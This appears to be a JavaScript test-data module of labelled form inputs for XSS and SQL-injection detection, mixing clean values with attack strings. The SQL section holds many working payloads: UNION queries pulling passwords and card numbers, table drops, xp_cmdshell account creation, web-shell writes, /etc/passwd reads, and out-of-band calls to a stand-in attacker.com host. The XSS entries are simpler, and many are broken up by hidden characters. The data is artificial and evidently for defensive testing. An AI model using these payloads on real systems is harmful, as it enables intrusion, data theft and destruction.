export default {
  xss: [
    {name: "comment", value: "Hello there!", type: "text"},
    {name: "comment", value: "I like this website.", type: "textarea"},
    {name: "comment", value: "test@example.com", type: "email"},
    {name: "comment", value: "12345", type: "number"},
    {name: "comment", value: "<b>bold text</b>", type: "html"},
    {name: "comment", value: "<sc­ript>alert('x')</sc­ript>", type: "html"},
    {name: "comment", value: "<img src='x' onerr­or='alert(1)'>", type: "html"},
    {name: "comment", value: "<svg/onlo­ad=alert(1)>", type: "html"},
    {name: "comment", value: "Just symbols <>", type: "text"},
    {name: "comment", value: "Very clean input.", type: "text"},

    {name: "comment", value: "0x123ABC", type: "text"},
    {name: "comment", value: "<di­v onclick='test'>hi</di­v>", type: "html"},
    {name: "comment", value: "Not a tag <te­st>", type: "text"},
    {
      name: "comment",
      value: "<a href='javascript:aler­t()'>Click</a>",
      type: "html",
    },
    {name: "comment", value: "+237670001122", type: "tel"},
    {name: "comment", value: "safe & trusted", type: "text"},
    {name: "comment", value: "<img src='none'>", type: "html"},
    {name: "comment", value: "<ifr­ame src='x'></ifr­ame>", type: "html"},
    {name: "comment", value: "SELECT * FROM users", type: "textarea"},
    {name: "comment", value: "<p>hello world</p>", type: "html"},

    {name: "comment", value: "simple message", type: "text"},
    {
      name: "comment",
      value: "<sc­ript>console.lo­g(1)</sc­ript>",
      type: "html",
    },
    {name: "comment", value: "<img src='x' onlo­ad='aler­t(2)'>", type: "html"},
    {name: "comment", value: "42", type: "number"},
    {name: "comment", value: "Testing emojis 💙", type: "text"},
    {name: "comment", value: "<<<<>>>>", type: "text"},
    {name: "comment", value: "<bod­y onload='alert(3)'>", type: "html"},
    {name: "comment", value: "{ data: true }", type: "textarea"},
    {name: "comment", value: "user@host.org", type: "email"},
    {name: "comment", value: "tel:+18005551234", type: "tel"},

    {name: "comment", value: "<span>hello</span>", type: "html"},
    {name: "comment", value: "<sc­ript>alert('test')</sc­ript>", type: "html"},
    {name: "comment", value: "<img src='x' ono­nclick='x'>", type: "html"},
    {name: "comment", value: "<a href='jav­ascript:'>Link</a>", type: "html"},
    {name: "comment", value: "Great value.", type: "text"},
    {name: "comment", value: "<di­v>test</di­v>", type: "html"},
    {name: "comment", value: "Phone 555-9944", type: "tel"},
    {name: "comment", value: "Random digits 2025", type: "text"},
    {name: "comment", value: "----====----", type: "text"},
    {name: "comment", value: "<u­l>underline</u­l>", type: "html"},

    {name: "comment", value: "<object data='x'></object>", type: "html"},
    {name: "comment", value: "<sc­ript>aler­t`x`</sc­ript>", type: "html"},
    {name: "comment", value: "This is valid text.", type: "textarea"},
    {name: "comment", value: "<img src=x onerro­r=1>", type: "html"},
    {name: "comment", value: "Line 1\nLine 2", type: "textarea"},
    {name: "comment", value: "<p onclick='ale­rt(99)'>Ok</p>", type: "html"},
    {name: "comment", value: "password123", type: "password"},
    {name: "comment", value: "clean message", type: "text"},
    {name: "comment", value: "Happy day!", type: "text"},
    {name: "comment", value: "<h1>Hi</h1>", type: "html"},

    {name: "comment", value: "<sc­riptx>alert(1)</sc­riptx>", type: "html"},
    {name: "comment", value: "<img src='none' oner­ror=alert>", type: "html"},
    {name: "comment", value: "Just watching movies", type: "textarea"},
    {name: "comment", value: "<svg><desc>x</desc></svg>", type: "html"},
    {name: "comment", value: "Nothing weird here", type: "text"},
    {name: "comment", value: "55443322", type: "number"},
    {name: "comment", value: "<a href='#'>Okay</a>", type: "html"},
    {name: "comment", value: "myemail@domain.com", type: "email"},
    {name: "comment", value: "<di­v id='x'>block</di­v>", type: "html"},
    {name: "comment", value: "safe message again", type: "text"},

    {name: "comment", value: "<sc­ript>alert`5`</sc­ript>", type: "html"},
    {name: "comment", value: "<img src='x' on­l oad='a(1)'>", type: "html"},
    {name: "comment", value: "just another one", type: "text"},
    {name: "comment", value: "198.12.1.1", type: "text"},
    {name: "comment", value: "<p>cool</p>", type: "html"},
    {name: "comment", value: "Thanks!", type: "text"},
    {name: "comment", value: "Long text block here", type: "textarea"},
    {name: "comment", value: "<sec­tion>hello</sec­tion>", type: "html"},
    {name: "comment", value: "<form action='x'></form>", type: "html"},
    {name: "comment", value: "232323", type: "number"},

    {name: "comment", value: "<sc­ript>alert()</sc­ript>", type: "html"},
    {name: "comment", value: '"Hello"', type: "text"},
    {name: "comment", value: "escape & test", type: "text"},
    {name: "comment", value: "<img x='y'>", type: "html"},
    {name: "comment", value: "999999", type: "number"},
    {name: "comment", value: "safe input 123", type: "text"},
    {name: "comment", value: "<lin­k rel='x'>", type: "html"},
    {name: "comment", value: "Another line", type: "textarea"},
    {name: "comment", value: "<br>", type: "html"},
    {name: "comment", value: "simple tel:443399", type: "tel"},

    {name: "comment", value: "<sc­ript>alert(true)</sc­ript>", type: "html"},
    {
      name: "comment",
      value: "<img src='invalid' one­rror='run'>",
      type: "html",
    },
    {name: "comment", value: "Some random string", type: "text"},
    {name: "comment", value: "✔ Verified", type: "text"},
    {name: "comment", value: "<u>pretty</u>", type: "html"},
    {name: "comment", value: "My secret pass", type: "password"},
    {name: "comment", value: "<table><tr></tr></table>", type: "html"},
    {name: "comment", value: "comment content", type: "textarea"},
    {name: "comment", value: "Sanitized test", type: "text"},
    {name: "comment", value: "<< click >>", type: "text"},

    {name: "comment", value: "<sc­ript>con­sole.log()</sc­ript>", type: "html"},
    {name: "comment", value: "<img dummy='1' onclickx='y'>", type: "html"},
    {name: "comment", value: "More clean stuff", type: "text"},
    {name: "comment", value: "African vibes 🇨🇲", type: "text"},
    {name: "comment", value: "<article>read</article>", type: "html"},
    {name: "comment", value: "141414", type: "number"},
    {name: "comment", value: "test again", type: "text"},
    {name: "comment", value: "yet another comment", type: "textarea"},
    {name: "comment", value: "<he­ader>head</he­ader>", type: "html"},
    {name: "comment", value: "secure!", type: "text"},

    {name: "comment", value: "<sc­ript>alert(999)</sc­ript>", type: "html"},
    {name: "comment", value: "<img bad='1' onc­lick='none'>", type: "html"},
    {name: "comment", value: "Message test", type: "text"},
    {name: "comment", value: "myname@test.com", type: "email"},
    {name: "comment", value: "<small>tiny</small>", type: "html"},
    {name: "comment", value: "098765", type: "number"},
    {name: "comment", value: "Good afternoon", type: "text"},
    {name: "comment", value: "Something special", type: "textarea"},
    {name: "comment", value: "<na­v>item</na­v>", type: "html"},
    {name: "comment", value: "telephone 00011", type: "tel"},

    {name: "comment", value: "<sc­ript>x()</sc­ript>", type: "html"},
    {name: "comment", value: "<di­v one­rror='x'>block</di­v>", type: "html"},
    {name: "comment", value: "final clean message", type: "text"},
    {name: "comment", value: "Last input sample", type: "textarea"},
    {name: "comment", value: "Bye!", type: "text"},
  ],

  sqli: [
    // Clean inputs (safe)
    {name: "username", value: "john_doe", type: "text"},
    {name: "email", value: "user@example.com", type: "email"},
    {name: "age", value: "25", type: "number"},
    {name: "search", value: "laptop computers", type: "text"},
    {name: "comment", value: "Great product!", type: "textarea"},
    {name: "id", value: "12345", type: "number"},
    {name: "password", value: "SecurePass123!", type: "password"},
    {name: "address", value: "123 Main St, City", type: "text"},
    {name: "phone", value: "+237670001122", type: "tel"},
    {
      name: "description",
      value: "This is a normal description",
      type: "textarea",
    },

    // Classic SQL Injection attacks
    {name: "username", value: "admin' OR '1'='1", type: "text"},
    {name: "password", value: "' OR '1'='1' --", type: "password"},
    {name: "id", value: "1 OR 1=1", type: "text"},
    {name: "search", value: "'; DROP TABLE users; --", type: "text"},
    {name: "email", value: "admin'--", type: "email"},
    {name: "username", value: "admin' OR 1=1#", type: "text"},
    {name: "id", value: "1' UNION SELECT NULL--", type: "text"},
    {name: "search", value: "' OR 'x'='x", type: "text"},
    {name: "username", value: "' OR ''='", type: "text"},
    {name: "comment", value: "test' OR '1'='1' /*", type: "textarea"},

    // Clean inputs
    {name: "product", value: "iPhone 15", type: "text"},
    {name: "quantity", value: "3", type: "number"},
    {name: "city", value: "Douala", type: "text"},
    {name: "country", value: "Cameroon", type: "text"},
    {name: "notes", value: "Please deliver before 5pm", type: "textarea"},
    {name: "zip", value: "00237", type: "text"},
    {name: "rating", value: "5", type: "number"},
    {name: "title", value: "Software Engineer", type: "text"},
    {name: "company", value: "Tech Corp Inc.", type: "text"},
    {name: "salary", value: "75000", type: "number"},

    // UNION-based injections
    {
      name: "id",
      value: "1' UNION SELECT username, password FROM users--",
      type: "text",
    },
    {
      name: "search",
      value: "' UNION ALL SELECT NULL,NULL,NULL--",
      type: "text",
    },
    {name: "category", value: "1' UNION SELECT @@version--", type: "text"},
    {
      name: "filter",
      value: "' UNION SELECT table_name FROM information_schema.tables--",
      type: "text",
    },
    {name: "id", value: "999' UNION SELECT 1,2,3,4,5--", type: "text"},
    {
      name: "search",
      value: "test' UNION SELECT NULL, username, password FROM admin--",
      type: "text",
    },
    {
      name: "product_id",
      value: "1 UNION SELECT column_name FROM information_schema.columns--",
      type: "text",
    },
    {
      name: "user_id",
      value: "' UNION SELECT credit_card FROM payments--",
      type: "text",
    },
    {name: "order_id", value: "1' UNION SELECT database()--", type: "text"},
    {
      name: "item",
      value: "' UNION SELECT user(),database(),version()--",
      type: "text",
    },

    // Clean inputs
    {name: "firstname", value: "Marie", type: "text"},
    {name: "lastname", value: "Dubois", type: "text"},
    {name: "birthdate", value: "1995-03-15", type: "date"},
    {name: "website", value: "https://example.com", type: "url"},
    {name: "bio", value: "Passionate developer from Africa", type: "textarea"},
    {name: "skills", value: "JavaScript, Python, SQL", type: "text"},
    {name: "experience", value: "5", type: "number"},
    {name: "department", value: "Engineering", type: "text"},
    {name: "project", value: "E-commerce Platform", type: "text"},
    {name: "budget", value: "50000", type: "number"},

    // Boolean-based blind injections
    {name: "id", value: "1' AND '1'='1", type: "text"},
    {name: "search", value: "' AND 1=1--", type: "text"},
    {name: "username", value: "admin' AND SLEEP(5)--", type: "text"},
    {
      name: "id",
      value: "1' AND (SELECT COUNT(*) FROM users) > 0--",
      type: "text",
    },
    {
      name: "filter",
      value:
        "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64--",
      type: "text",
    },
    {name: "category", value: "1' AND 1=1 AND 'a'='a", type: "text"},
    {
      name: "user_id",
      value: "' AND EXISTS(SELECT * FROM admin)--",
      type: "text",
    },
    {name: "product", value: "test' AND LENGTH(database())>5--", type: "text"},
    {
      name: "search",
      value: "' AND SUBSTRING(@@version,1,1)='5'--",
      type: "text",
    },
    {
      name: "id",
      value:
        "1' AND (SELECT user FROM mysql.user WHERE user='root') = 'root'--",
      type: "text",
    },

    // Clean inputs
    {name: "message", value: "Hello, how are you?", type: "textarea"},
    {name: "subject", value: "Meeting Request", type: "text"},
    {name: "priority", value: "high", type: "text"},
    {name: "status", value: "pending", type: "text"},
    {name: "tags", value: "urgent, important", type: "text"},
    {name: "color", value: "#FF5733", type: "color"},
    {name: "discount", value: "15", type: "number"},
    {name: "tax", value: "8.5", type: "number"},
    {name: "shipping", value: "express", type: "text"},
    {name: "tracking", value: "TRK123456789", type: "text"},

    // Time-based blind injections
    {name: "id", value: "1'; WAITFOR DELAY '00:00:05'--", type: "text"},
    {
      name: "username",
      value: "admin'; IF(1=1) WAITFOR DELAY '0:0:5'--",
      type: "text",
    },
    {name: "search", value: "' OR SLEEP(5)--", type: "text"},
    {
      name: "id",
      value: "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
      type: "text",
    },
    {
      name: "filter",
      value: "'; EXEC sp_executesql N'WAITFOR DELAY ''00:00:05'''--",
      type: "text",
    },
    {name: "user_id", value: "1' AND IF(1=1, SLEEP(5), 0)--", type: "text"},
    {
      name: "product_id",
      value: "' OR BENCHMARK(5000000,MD5('test'))--",
      type: "text",
    },
    {name: "category", value: "1'; DBMS_LOCK.SLEEP(5);--", type: "text"},
    {name: "search", value: "' AND SLEEP(5) AND 'x'='x", type: "text"},
    {
      name: "id",
      value: "1' AND (SELECT sleep(5) FROM dual WHERE 1=1)--",
      type: "text",
    },

    // Clean inputs
    {name: "invoice", value: "INV-2024-001", type: "text"},
    {name: "reference", value: "REF123ABC", type: "text"},
    {name: "amount", value: "299.99", type: "number"},
    {name: "currency", value: "USD", type: "text"},
    {name: "method", value: "credit_card", type: "text"},
    {name: "cardnumber", value: "****1234", type: "text"},
    {name: "cvv", value: "***", type: "password"},
    {name: "expiry", value: "12/25", type: "text"},
    {name: "holder", value: "John Smith", type: "text"},
    {name: "bank", value: "Chase Bank", type: "text"},

    // Stacked queries injections
    {name: "id", value: "1'; DELETE FROM users WHERE '1'='1", type: "text"},
    {
      name: "username",
      value: "admin'; INSERT INTO users VALUES('hacker','pass')--",
      type: "text",
    },
    {
      name: "search",
      value: "'; UPDATE users SET password='hacked'--",
      type: "text",
    },
    {name: "id", value: "1'; DROP TABLE products;--", type: "text"},
    {name: "filter", value: "'; CREATE TABLE hackers(id INT);--", type: "text"},
    {
      name: "category",
      value: "1'; ALTER TABLE users ADD COLUMN backdoor VARCHAR(255);--",
      type: "text",
    },
    {name: "user_id", value: "'; TRUNCATE TABLE logs;--", type: "text"},
    {name: "product_id", value: "1'; EXEC xp_cmdshell('dir');--", type: "text"},
    {
      name: "order_id",
      value: "'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'localhost';--",
      type: "text",
    },
    {
      name: "item_id",
      value: "1'; BACKUP DATABASE mydb TO DISK='c:\\hack.bak';--",
      type: "text",
    },

    // Clean inputs
    {name: "username", value: "alice_wonderland", type: "text"},
    {name: "nickname", value: "Ali", type: "text"},
    {name: "language", value: "English", type: "text"},
    {name: "timezone", value: "GMT+1", type: "text"},
    {name: "theme", value: "dark", type: "text"},
    {name: "font", value: "Arial", type: "text"},
    {name: "size", value: "medium", type: "text"},
    {name: "layout", value: "grid", type: "text"},
    {name: "notifications", value: "enabled", type: "text"},
    {name: "privacy", value: "friends", type: "text"},

    // Out-of-band (OOB) injections
    {
      name: "id",
      value: "1'; EXEC master..xp_dirtree '\\\\attacker.com\\share'--",
      type: "text",
    },
    {
      name: "search",
      value: "' UNION SELECT LOAD_FILE('\\\\\\attacker.com\\\\file')--",
      type: "text",
    },
    {
      name: "username",
      value:
        "admin'; DECLARE @q VARCHAR(1024); SET @q='\\\\attacker.com\\'; EXEC master..xp_dirtree @q;--",
      type: "text",
    },
    {
      name: "filter",
      value:
        "' OR 1=UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT user FROM dual))--",
      type: "text",
    },
    {
      name: "id",
      value:
        "1' AND (SELECT * FROM OPENROWSET('SQLOLEDB','Network=DBMSSOCN;Address=attacker.com,80;uid=sa;pwd=pass','SELECT 1'))--",
      type: "text",
    },
    {
      name: "product",
      value: "'; SELECT UTL_INADDR.GET_HOST_ADDRESS('attacker.com'||user);--",
      type: "text",
    },
    {
      name: "category",
      value:
        '1\' UNION SELECT extractvalue(xmltype(\'<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://attacker.com/"> %remote;]>\'),\'/l\')--',
      type: "text",
    },
    {
      name: "user_id",
      value:
        "' OR 1=1; EXEC sp_OACreate 'WScript.Shell', @obj OUTPUT; EXEC sp_OAMethod @obj, 'Run', null, 'cmd /c ping attacker.com'--",
      type: "text",
    },
    {
      name: "search",
      value: "' AND 1=DNS_QUERY('attacker.com')--",
      type: "text",
    },
    {
      name: "id",
      value:
        "1'; SELECT * FROM OPENQUERY(LINK,'SELECT 1; EXEC master..xp_cmdshell ''nslookup attacker.com''')--",
      type: "text",
    },

    // Clean inputs
    {name: "model", value: "Toyota Camry", type: "text"},
    {name: "year", value: "2024", type: "number"},
    {name: "color", value: "Silver", type: "text"},
    {name: "mileage", value: "15000", type: "number"},
    {name: "fuel", value: "Gasoline", type: "text"},
    {name: "transmission", value: "Automatic", type: "text"},
    {name: "doors", value: "4", type: "number"},
    {name: "seats", value: "5", type: "number"},
    {name: "vin", value: "1HGBH41JXMN109186", type: "text"},
    {name: "plate", value: "ABC-1234", type: "text"},

    // Encoded/obfuscated injections
    {name: "username", value: "admin%27%20OR%20%271%27%3D%271", type: "text"},
    {
      name: "search",
      value: "test%27%3B%20DROP%20TABLE%20users%3B--",
      type: "text",
    },
    {name: "id", value: "1%27%20UNION%20SELECT%20NULL--", type: "text"},
    {name: "filter", value: "admin'+OR+'1'='1", type: "text"},
    {name: "category", value: "1' UnIoN SeLeCt NULL--", type: "text"},
    {name: "user_id", value: "admin'/**/OR/**/1=1--", type: "text"},
    {name: "product", value: "' OR 1=1%00", type: "text"},
    {name: "search", value: "admin' /*!50000OR*/ 1=1--", type: "text"},
    {name: "id", value: "1' %55nion %53elect NULL--", type: "text"},
    {name: "username", value: "admin'||'1'='1", type: "text"},

    // Clean inputs
    {name: "category", value: "Electronics", type: "text"},
    {name: "subcategory", value: "Smartphones", type: "text"},
    {name: "brand", value: "Samsung", type: "text"},
    {name: "model", value: "Galaxy S24", type: "text"},
    {name: "price", value: "999", type: "number"},
    {name: "stock", value: "50", type: "number"},
    {name: "weight", value: "0.2", type: "number"},
    {name: "dimensions", value: "15x8x0.8 cm", type: "text"},
    {name: "warranty", value: "2 years", type: "text"},
    {name: "manufacturer", value: "Samsung Electronics", type: "text"},

    // Second-order injections
    {name: "username", value: "admin'-- ", type: "text"},
    {
      name: "email",
      value: "test@test.com' UNION SELECT password FROM users--",
      type: "email",
    },
    {
      name: "comment",
      value: "Nice product'; DROP TABLE reviews;--",
      type: "textarea",
    },
    {name: "description", value: "Good item' OR '1'='1' --", type: "textarea"},
    {
      name: "bio",
      value:
        "I am a developer'; UPDATE users SET role='admin' WHERE username='hacker';--",
      type: "textarea",
    },
    {
      name: "address",
      value: "123 Street'; DELETE FROM orders WHERE '1'='1",
      type: "text",
    },
    {
      name: "notes",
      value: "Remember this' UNION SELECT credit_card FROM payments--",
      type: "textarea",
    },
    {
      name: "feedback",
      value: "Great service' AND SLEEP(10)--",
      type: "textarea",
    },
    {
      name: "review",
      value: "5 stars'; INSERT INTO admins VALUES('hacker','pass')--",
      type: "textarea",
    },
    {
      name: "message",
      value: "Hello' OR 1=1; EXEC xp_cmdshell('calc')--",
      type: "textarea",
    },

    // Clean inputs
    {name: "location", value: "New York", type: "text"},
    {name: "latitude", value: "40.7128", type: "number"},
    {name: "longitude", value: "-74.0060", type: "number"},
    {name: "altitude", value: "10", type: "number"},
    {name: "timezone", value: "America/New_York", type: "text"},
    {name: "country_code", value: "US", type: "text"},
    {name: "postal_code", value: "10001", type: "text"},
    {name: "region", value: "Northeast", type: "text"},
    {name: "population", value: "8000000", type: "number"},
    {name: "area", value: "783.8", type: "number"},

    // Database-specific injections (MySQL)
    {name: "id", value: "1' AND SUBSTRING(version(),1,1)='5'--", type: "text"},
    {
      name: "search",
      value: "' UNION SELECT LOAD_FILE('/etc/passwd')--",
      type: "text",
    },
    {
      name: "username",
      value: "admin' AND MID(password,1,1)='a'--",
      type: "text",
    },
    {
      name: "filter",
      value: "' OR ASCII(LOWER(SUBSTRING((SELECT user()),1,1)))=114--",
      type: "text",
    },
    {
      name: "id",
      value: "1' INTO OUTFILE '/var/www/html/shell.php'--",
      type: "text",
    },
    {
      name: "category",
      value:
        "' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--",
      type: "text",
    },
    {
      name: "user_id",
      value:
        "admin' AND ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20) FROM users LIMIT 1),1,1))>64--",
      type: "text",
    },
    {
      name: "product",
      value: "' UNION SELECT HEX(password) FROM users--",
      type: "text",
    },
    {
      name: "search",
      value: "' AND (SELECT * FROM (SELECT SLEEP(5))x)--",
      type: "text",
    },
    {
      name: "id",
      value:
        "1' PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x5c,(SELECT user()))))--",
      type: "text",
    },

    // Clean inputs
    {name: "event", value: "Annual Conference", type: "text"},
    {name: "date", value: "2024-12-01", type: "date"},
    {name: "time", value: "14:30", type: "time"},
    {name: "duration", value: "120", type: "number"},
    {name: "venue", value: "Grand Hotel", type: "text"},
    {name: "capacity", value: "500", type: "number"},
    {name: "organizer", value: "Tech Events Inc.", type: "text"},
    {name: "sponsor", value: "Microsoft", type: "text"},
    {name: "ticket_price", value: "150", type: "number"},
    {name: "registration", value: "open", type: "text"},

    // Database-specific injections (PostgreSQL)
    {name: "id", value: "1'; COPY users TO '/tmp/users.txt'--", type: "text"},
    {
      name: "search",
      value: "' UNION SELECT NULL,current_database(),NULL--",
      type: "text",
    },
    {
      name: "username",
      value: "admin' AND 1=CAST((SELECT version()) AS INT)--",
      type: "text",
    },
    {name: "filter", value: "' OR 1=1; SELECT pg_sleep(5)--", type: "text"},
    {
      name: "id",
      value:
        "1'; CREATE FUNCTION shell() RETURNS TEXT AS $$ import os; os.system('id') $$ LANGUAGE plpython3u;--",
      type: "text",
    },
    {
      name: "category",
      value:
        "' UNION SELECT NULL,tablename,NULL FROM pg_tables WHERE schemaname='public'--",
      type: "text",
    },
    {
      name: "user_id",
      value:
        "' OR 1=CAST((SELECT string_agg(usename,',') FROM pg_user) AS INT)--",
      type: "text",
    },
    {
      name: "product",
      value: "' UNION SELECT NULL,lo_import('/etc/passwd'),NULL--",
      type: "text",
    },
    {
      name: "search",
      value: "'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com'--",
      type: "text",
    },
    {
      name: "id",
      value: "1' AND 1=CAST((SELECT current_setting('is_superuser')) AS INT)--",
      type: "text",
    },

    // Clean inputs
    {name: "article", value: "Introduction to AI", type: "text"},
    {name: "author", value: "Dr. Smith", type: "text"},
    {name: "published", value: "2024-01-15", type: "date"},
    {name: "views", value: "1500", type: "number"},
    {name: "likes", value: "320", type: "number"},
    {name: "shares", value: "45", type: "number"},
    {name: "category", value: "Technology", type: "text"},
    {name: "tags", value: "AI, Machine Learning, Tech", type: "text"},
    {
      name: "summary",
      value: "An overview of artificial intelligence",
      type: "textarea",
    },
    {name: "reading_time", value: "5", type: "number"},

    // Database-specific injections (MSSQL)
    {
      name: "id",
      value: "1'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--",
      type: "text",
    },
    {
      name: "search",
      value: "' UNION SELECT NULL,name,NULL FROM master..sysdatabases--",
      type: "text",
    },
    {
      name: "username",
      value:
        "admin'; EXEC xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\\CurrentControlSet\\Services\\MSSQLSERVER','ObjectName';--",
      type: "text",
    },
    {
      name: "filter",
      value: "' OR 1=CAST((SELECT @@version) AS INT)--",
      type: "text",
    },
    {
      name: "id",
      value: "1'; EXEC xp_cmdshell 'net user hacker Pass123! /add';--",
      type: "text",
    },
    {
      name: "category",
      value: "' UNION SELECT NULL,name,NULL FROM sys.tables--",
      type: "text",
    },
    {
      name: "user_id",
      value: "admin' AND 1=CAST((SELECT SYSTEM_USER) AS INT)--",
      type: "text",
    },
    {
      name: "product",
      value:
        "'; EXEC sp_makewebtask '\\\\attacker.com\\share\\output.html','SELECT * FROM users'--",
      type: "text",
    },
    {name: "search", value: "' OR 1=HAS_DBACCESS('master')--", type: "text"},
    {
      name: "id",
      value: "1'; EXEC xp_servicecontrol 'start','schedule';--",
      type: "text",
    },

    // Clean inputs
    {name: "course", value: "Web Development", type: "text"},
    {name: "instructor", value: "Prof. Johnson", type: "text"},
    {name: "level", value: "Intermediate", type: "text"},
    {name: "duration", value: "8", type: "number"},
    {name: "students", value: "150", type: "number"},
    {name: "rating", value: "4.7", type: "number"},
    {name: "price", value: "299", type: "number"},
    {name: "language", value: "English", type: "text"},
    {name: "certificate", value: "yes", type: "text"},
    {name: "prerequisites", value: "Basic HTML/CSS", type: "text"},

    // Tricky edge cases
    {name: "username", value: "admin'='admin'--", type: "text"},
    {name: "search", value: "1' HAVING 1=1--", type: "text"},
    {name: "id", value: "1' GROUP BY 1,2,3--", type: "text"},
    {name: "filter", value: "' ORDER BY 10--", type: "text"},
    {name: "category", value: "1' LIMIT 1 OFFSET 0--", type: "text"},
    {
      name: "user_id",
      value:
        "'; BEGIN DECLARE @var VARCHAR(8000) SET @var=':' EXEC(@var) END--",
      type: "text",
    },
    {name: "product", value: "' WHERE 1=1--", type: "text"},
    {name: "search", value: "admin')+OR+('1'='1", type: "text"},
    {name: "id", value: "1' AND '1'='1'--", type: "text"},
    {name: "username", value: "' OR username IS NOT NULL--", type: "text"},

    // Clean inputs
    {name: "recipe", value: "Chocolate Cake", type: "text"},
    {name: "ingredients", value: "flour, sugar, cocoa", type: "textarea"},
    {name: "servings", value: "8", type: "number"},
    {name: "prep_time", value: "30", type: "number"},
    {name: "cook_time", value: "45", type: "number"},
    {name: "difficulty", value: "medium", type: "text"},
    {name: "cuisine", value: "Dessert", type: "text"},
    {name: "calories", value: "350", type: "number"},
    {name: "chef", value: "Chef Marie", type: "text"},
    {name: "rating", value: "4.9", type: "number"},

    // More tricky cases with comments
    {name: "id", value: "1'-- -", type: "text"},
    {name: "search", value: "admin'#", type: "text"},
    {name: "username", value: "test'/*comment*/OR/**/1=1--", type: "text"},
    {name: "filter", value: "1'/*!50000AND*/1=1--", type: "text"},
    {name: "id", value: "1';--+", type: "text"},
    {name: "category", value: "' OR '1'='1'({", type: "text"},
    {name: "user_id", value: "admin' AND 1=1--+-", type: "text"},
    {name: "product", value: "test';#comment", type: "text"},
    {name: "search", value: "1' AND 1=1--%20", type: "text"},
    {name: "id", value: "1' AND 1=1/*!--*/--", type: "text"},

    // Final clean inputs
    {name: "store", value: "Main Branch", type: "text"},
    {name: "manager", value: "John Williams", type: "text"},
    {name: "employees", value: "25", type: "number"},
    {name: "revenue", value: "500000", type: "number"},
    {name: "established", value: "2015", type: "number"},
    {name: "type", value: "Retail", type: "text"},
    {name: "hours", value: "9am-9pm", type: "text"},
    {name: "parking", value: "available", type: "text"},
    {name: "delivery", value: "yes", type: "text"},
    {name: "returns", value: "30 days", type: "text"},
  ],
};
